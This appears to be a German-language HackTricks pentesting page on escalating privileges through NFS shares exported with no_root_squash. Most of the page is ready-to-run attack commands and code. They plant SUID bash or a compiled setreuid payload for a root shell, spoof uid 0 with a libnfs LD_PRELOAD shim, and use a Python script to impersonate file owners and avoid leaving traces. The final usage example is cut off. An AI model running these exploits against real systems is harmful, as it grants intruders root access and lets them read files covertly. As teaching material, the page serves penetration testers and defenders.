{{#include ../../banners/hacktricks-training.md}}

# Squashing Grundinformationen

NFS wird normalerweise (insbesondere unter Linux) dem angegebenen `uid` und `gid` des Clients, der sich verbindet, vertrauen, um auf die Dateien zuzugreifen (wenn Kerberos nicht verwendet wird). Es gibt jedoch einige Konfigurationen, die auf dem Server gesetzt werden können, um **dieses Verhalten zu ändern**:

- **`all_squash`**: Es squash alle Zugriffe, indem jeder Benutzer und jede Gruppe auf **`nobody`** (65534 unsigned / -2 signed) abgebildet wird. Daher ist jeder `nobody` und es werden keine Benutzer verwendet.
- **`root_squash`/`no_all_squash`**: Dies ist standardmäßig unter Linux und **squasht nur den Zugriff mit uid 0 (root)**. Daher werden alle `UID` und `GID` vertraut, aber `0` wird auf `nobody` gesquasht (so ist keine Root-Imitation möglich).
- **``no_root_squash`**: Diese Konfiguration, wenn aktiviert, squasht nicht einmal den Root-Benutzer. Das bedeutet, dass Sie, wenn Sie ein Verzeichnis mit dieser Konfiguration einhängen, darauf als Root zugreifen können.

In der **/etc/exports**-Datei, wenn Sie ein Verzeichnis finden, das als **no_root_squash** konfiguriert ist, können Sie **darauf zugreifen** **als Client** und **in dieses Verzeichnis schreiben**, **als ob** Sie der lokale **Root** der Maschine wären.

Für weitere Informationen über **NFS** siehe:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilegieneskalation

## Remote Exploit

Option 1 unter Verwendung von bash:
- **Dieses Verzeichnis** auf einer Client-Maschine einhängen und **als Root** die **/bin/bash**-Binärdatei in den eingehängten Ordner kopieren und ihr **SUID**-Rechte geben, und **von der Opfer**-Maschine diese bash-Binärdatei ausführen.
- Beachten Sie, dass, um Root innerhalb des NFS-Teils zu sein, **`no_root_squash`** auf dem Server konfiguriert sein muss.
- Wenn es jedoch nicht aktiviert ist, könnten Sie zu einem anderen Benutzer eskalieren, indem Sie die Binärdatei in den NFS-Teil kopieren und ihr die SUID-Berechtigung als den Benutzer geben, zu dem Sie eskalieren möchten.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 unter Verwendung von C kompiliertem Code:
- **Mounten Sie dieses Verzeichnis** auf einer Client-Maschine und **kopieren Sie als root** unser kompiliertes Payload in den gemounteten Ordner, das die SUID-Berechtigung ausnutzt, geben Sie ihm **SUID**-Rechte und **führen Sie von der Opfer**-Maschine diese Binärdatei aus (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
- Dieselben Einschränkungen wie zuvor.
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokaler Exploit

> [!NOTE]
> Beachten Sie, dass Sie, wenn Sie einen **Tunnel von Ihrem Rechner zum Opferrechner erstellen können, weiterhin die Remote-Version verwenden können, um diese Privilegieneskalation durch Tunneln der erforderlichen Ports auszunutzen**.\
> Der folgende Trick gilt, falls die Datei `/etc/exports` **eine IP angibt**. In diesem Fall **werden Sie auf keinen Fall** die **Remote-Exploit** verwenden können und müssen **diesen Trick ausnutzen**.\
> Eine weitere erforderliche Bedingung, damit der Exploit funktioniert, ist, dass **der Export in `/etc/export`** **das `insecure`-Flag verwenden muss**.\
> --_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--

## Grundinformationen

Das Szenario beinhaltet das Ausnutzen eines gemounteten NFS-Teils auf einem lokalen Rechner, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben, was potenziell unbefugten Zugriff ermöglicht. Der Exploit beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.

### Kompilieren der Bibliothek

Die Schritte zur Kompilierung der Bibliothek könnten Anpassungen basierend auf der Kernelversion erfordern. In diesem speziellen Fall wurden die fallocate-Systemaufrufe auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Durchführung des Exploits

Der Exploit besteht darin, ein einfaches C-Programm (`pwn.c`) zu erstellen, das die Berechtigungen auf root erhöht und dann eine Shell ausführt. Das Programm wird kompiliert, und die resultierende Binärdatei (`a.out`) wird im Share mit suid root platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:

1. **Kompiliere den Exploit-Code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Platziere den Exploit im Share und ändere seine Berechtigungen, indem du die uid fälschst:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Führen Sie den Exploit aus, um Root-Rechte zu erlangen:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell für stealthy Datei Zugriff

Sobald Root-Zugriff erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS-Share zu interagieren, ohne den Besitz zu ändern (um Spuren zu vermeiden). Dieses Skript passt die uid an, um mit der des zuzugreifenden Datei übereinzustimmen, was die Interaktion mit Dateien auf dem Share ohne Berechtigungsprobleme ermöglicht:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Führen Sie aus wie:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
